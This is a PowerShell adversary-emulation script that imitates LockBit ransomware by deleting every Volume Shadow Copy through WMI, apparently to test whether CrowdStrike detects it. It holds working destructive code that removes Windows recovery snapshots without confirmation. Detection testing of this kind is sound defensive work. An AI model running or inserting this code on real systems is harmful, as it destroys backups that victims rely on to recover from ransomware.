<#
.SYNOPSIS
    LockBit WMI Shadow Copy Deletion - DETECTION TRIGGER
.DESCRIPTION
    Uses WMI to delete Volume Shadow Copies.
    Will trigger EDR detection for T1047/T1490.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1047, T1490
#>
Write-Host "[*] Starting LockBit Shadow Copy Deletion (T1047)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for ransomware behavior" -ForegroundColor Yellow

try {
    # Check if running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator - shadow deletion will fail" -ForegroundColor Red
    }
    
    # First enumerate shadows
    $shadows = Get-WmiObject Win32_Shadowcopy -ErrorAction SilentlyContinue
    
    if ($shadows) {
        Write-Host "[*] Found $($shadows.Count) shadow copies" -ForegroundColor Yellow
        
        foreach ($shadow in $shadows) {
            Write-Host "[*] Deleting shadow: $($shadow.ID)"
            
            # ACTUAL DETECTION TRIGGER - This WILL delete shadow copies
            $shadow.Delete()
            
            Write-Host "[+] Deleted: $($shadow.ID)" -ForegroundColor Green
        }
        
        Write-Host "[+] SUCCESS: All shadow copies deleted" -ForegroundColor Green
        Write-Host "[!] CrowdStrike should detect: 'ShadowCopyDelete' or 'RansomwareBehavior'" -ForegroundColor Magenta
    } else {
        Write-Host "[-] No shadow copies found to delete" -ForegroundColor Gray
        Write-Host "[*] Creating and deleting a test shadow to trigger detection..." -ForegroundColor Yellow
        
        # Create a shadow copy first, then delete it
        try {
            $wmi = [WMICLASS]"root\cimv2:win32_shadowcopy"
            $result = $wmi.Create("C:\", "ClientAccessible")
            
            if ($result.ReturnValue -eq 0) {
                Write-Host "[+] Created test shadow copy" -ForegroundColor Green
                Start-Sleep -Seconds 2
                
                $newShadow = Get-WmiObject Win32_Shadowcopy | Select-Object -First 1
                if ($newShadow) {
                    $newShadow.Delete()
                    Write-Host "[+] Deleted test shadow copy - detection should trigger" -ForegroundColor Green
                }
            }
        } catch {
            Write-Host "[!] Could not create test shadow: $_" -ForegroundColor Red
        }
    }
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
